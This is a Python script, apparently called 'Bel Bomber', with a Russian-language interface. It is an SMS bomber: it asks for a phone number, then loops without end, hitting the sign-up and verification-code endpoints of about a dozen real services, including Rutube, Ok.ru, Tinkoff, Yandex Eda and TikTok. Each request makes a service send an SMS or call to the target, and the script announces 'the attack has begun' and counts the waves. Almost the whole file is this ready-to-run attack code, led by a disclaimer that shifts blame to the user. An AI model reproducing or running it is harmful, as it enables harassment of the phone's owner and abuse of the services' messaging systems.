import requests, time, colorama, os

clear = 'clear'
os.system(clear)

mn = ("""
\033[32m╭━━╮   ╭╮\033[35m ╭━━╮      ╭╮
\033[32m┃╭╮┃   ┃┃\033[35m ┃╭╮┃      ┃┃
\033[32m┃╰╯╰┳━━┫┃\033[35m ┃╰╯╰┳━━┳╮╭┫╰━┳━━┳━╮
\033[32m┃╭━╮┃┃━┫┃\033[35m ┃╭━╮┃╭╮┃╰╯┃╭╮┃┃━┫╭╯
\033[32m┃╰━╯┃┃━┫╰╮\033[35m┃╰━╯┃╰╯┃┃┃┃╰╯┃┃━┫┃
\033[32m╰━━━┻━━┻━╯\033[35m╰━━━┻━━┻┻┻┻━━┻━━┻╯
\033[31mBy Nimfo  VK:\033[37m \033[0m@nimfo_trape

\033[0m\033[1m  Внимание! Автор данного ПО ни к чему не
  призывает, вся ответственность за ваши действия
  будет лежать только на вас!
 """)

print(mn)

while True:
	print("\033[0m Чтобы выйти введите \033[31mxx\033[0m")
	phone = input("\033[36m [\033[33m\033[1mНомер телефона\033[0m\033[36m]\033[34m:\033[0m \033[35m\033[1m\033[0m\033[35m")
	phone = phone.replace('+', '')
	phone = phone.replace('-', '')
	phone = phone.replace(' ', '')
	phone = phone.replace('(', '')
	phone = phone.replace(')', '')
	if phone == 'xx':
		os.system(clear)
		print(mn)
		print("\033[31mВведите номер!\033[0m")
	if phone == '' or phone == ' ':
		os.system(clear)
		print(mn)
		break
	else:
		nx = 0
		try:
			phone = int(phone)
			nx = 1
		except:
			os.system(clear)
			print(mn)
			print("\033[31mМожно вводить только цифры\033[0m")
		if nx == 1:
			phone = str(phone)
			act = 0

			phone_shopby = '+'+phone[0:3]+' '+'('+phone[3:5]+')'+' '+phone[5:8]+'-'+phone[8:10]+'-'+phone[10:12]
			phone_res = phone[3:]
			header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 YaBrowser/20.3.2.242 Yowser/2.5 Safari/537.36'}
			print("\033[32mАтака началась.\033[0m")
			print()
			print("\033[42m\033[30mЧто бы остановить спам, жмите \033[31mctrl+z\033[0m\033[0m")
			nms = 1
			nvs = 1
			while True:
				try:
					beltelecom = requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', headers=header, data={'phone': phone})
					if beltelecom.status_code == 200:
						print("\033[32m\033[1m Beltelecom СМС отправлено!\033[0m \033[37m[\033[36m"+str(nms)+"\033[37m]\033[0m")
						nms += 1
					else:
						print("\033[31m\033[1m Beltelecom СМС не отправлено!\033[0m")
				except:
					error_rqs = 0
				time.sleep(0.3)
				try:
					bamboogroup = requests.get('https://mobilemarketing.by/validate?msisdn='+phone)
					if bamboogroup.status_code == 200:
						print("\033[32m\033[1m Bamboogroup СМС отправлено!\033[0m \033[37m[\033[36m"+str(nms)+"\033[37m]\033[0m")
						nms += 1
					else:
						print("\033[31m\033[1m Bamboogroup СМС не отправлено!\033[0m")
				except:
					error_rqs = 0
				time.sleep(0.3)
				try:
					rutube = requests.post('https://pass.rutube.ru/api/accounts/phone/send-code/', headers=header, data={'phone': "+"+phone})
					if rutube.status_code == 200:
						print("\033[32m\033[1m Rutube СМС отправлено!\033[0m \033[37m[\033[36m"+str(nms)+"\033[37m]\033[0m")
						nms += 1
					else:
						print("\033[31m\033[1m Rutube СМС не отправлено!\033[0m")
				except:
					error_rqs = 0
				time.sleep(0.3)
				try:
					ivi = requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6/', headers=header, data={'phone': phone, 'app_version': '2276'})
					if ivi.status_code == 200:
						print("\033[32m\033[1m IVI СМС отправлено!\033[0m \033[37m[\033[36m"+str(nms)+"\033[37m]\033[0m")
						nms += 1
					else:
						print("\033[31m\033[1m IVI СМС не отправлено!\033[0m")
					
				except:
					error_rqs = 0
				time.sleep(0.3)
				try:
					shopby = requests.post('https://shop.by/management/user/register/?phone=2&lctn=shopby/', headers=header, data={'LRegisterForm[phone]': str(phone_shopby)})
					if shopby.status_code == 200:
						print("\033[32m\033[1m Shop.by СМС отправлено!\033[0m \033[37m[\033[36m"+str(nms)+"\033[37m]\033[0m")
						nms += 1
					else:
						print("\033[31m\033[1m Shop.by СМС не отправлено!\033[0m")
					
				except:
					error_rqs = 0
				time.sleep(0.3)
				try:
					icq = requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
					if icq.status_code == 200:
						print("\033[32m\033[1m ICQ СМС отправлено!\033[0m \033[37m[\033[36m"+str(nms)+"\033[37m]\033[0m")
						nms += 1
					else:
						print("\033[31m\033[1m ICQ СМС не отправлено!\033[0m")
					
				except:
					error_rqs = 0
				time.sleep(0.3)
				try:
					okru = requests.post('https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone', data={'st.r.phone': '+'+phone})
					if okru.status_code == 200:
						print("\033[32m\033[1m Ok.ru СМС отправлено!\033[0m \033[37m[\033[36m"+str(nms)+"\033[37m]\033[0m")
						nms += 1
					else:
						print("\033[31m\033[1m Ok.ru СМС не отправлено!\033[0m")
					
				except:
					error_rqs = 0
				time.sleep(0.3)
				try:
					youla = requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': ""+phone})
					if youla.status_code == 200:
						print("\033[32m\033[1m Youla СМС отправлено!\033[0m \033[37m[\033[36m"+str(nms)+"\033[37m]\033[0m")
						nms += 1
					else:
						print("\033[31m\033[1m Youla СМС не отправлено!\033[0m")
					
				except:
					error_rqs = 0
				time.sleep(0.3)
				try:
					yandex_eda = requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+"+phone})
					if yandex_eda.status_code == 200:
						print("\033[32m\033[1m Yandex Eda СМС отправлено!\033[0m \033[37m[\033[36m"+str(nms)+"\033[37m]\033[0m")
						nms += 1
					else:
						print("\033[31m\033[1m Yandex Eda СМС не отправлено!\033[0m")
					
				except:
					error_rqs = 0
				time.sleep(0.3)
				try:
					tinkoff = requests.post('https://api.tinkoff.ru/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=kbq3Tv1QYVGdKMAvaqwg4mb1qHEOVZe6.m1-prod-api24&wuid=824a46d8fc4a3be678c28824f8aa4050', data={'phone': '+'+phone})
					if tinkoff.status_code == 200:
						print("\033[32m\033[1m Tinkoff СМС отправлено!\033[0m \033[37m[\033[36m"+str(nms)+"\033[37m]\033[0m")
						nms += 1
					else:
						print("\033[31m\033[1m Tinkoff СМС не отправлено!\033[0m")
					
				except:
					error_rqs = 0
				time.sleep(0.3)
				try:
					utair = requests.post('https://b.utair.ru/api/v1/login/', data={'login': ""+phone, 'confirmation_type': "call_code"}) #call
					if utair.status_code == 200:
						print("\033[32m\033[1m Utair СМС отправлено!\033[0m \033[37m[\033[36m"+str(nms)+"\033[37m]\033[0m")
						nms += 1
					else:
						print("\033[31m\033[1m Utair СМС не отправлено!\033[0m")
					
				except:
					error_rqs = 0
				time.sleep(0.3)
				try:
					tiktok = requests.post('https://m.tiktok.com/node-a/send/download_link?aid=1988&app_name=tiktok_web&device_platform=web&referer=https:%2F%2Fyandex.by%2F&user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML,+like+Gecko)+Chrome%2F83.0.4103.116+YaBrowser%2F20.7.2.115+Yowser%2F2.5+Safari%2F537.36&cookie_enabled=true&screen_width=1920&screen_height=1080&browser_language=ru&browser_platform=Win32&browser_name=Mozilla&browser_version=5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML,+like+Gecko)+Chrome%2F83.0.4103.116+YaBrowser%2F20.7.2.115+Yowser%2F2.5+Safari%2F537.36&browser_online=true&timezone_name=Europe%2FMinsk&priority_region=&appId=1233&region=BY&appType=m&isAndroid=false&isMobile=false&isIOS=false&OS=windows&did=6856052719484995078&verifyFp=verify_kdbvb7pa_DXDSJwBZ_XzPX_4yR9_BWDm_gHFEqUjmdYGS', headers=header, data={'slideVerify': 0, 'language': "ru", 'PhoneRegionCode': "375", 'Mobile': ""+str(phone_res), 'page': {'pageName': "home", 'launchMode': "organic", 'trafficType': "yandex"}})
					if tiktok.status_code == 200:
						print("\033[32m\033[1m TikTok СМС отправлено!\033[0m \033[37m[\033[36m"+str(nms)+"\033[37m]\033[0m")
						nms += 1
					else:
						print("\033[31m\033[1m TikTok СМС не отправлено!\033[0m")
					
				except:
					error_rqs = 0
				print("\033[33mВолна номер \033[36m"+str(nvs)+" \033[33mпройдена!\033[0m")
				nvs+=1
				time.sleep(2.7)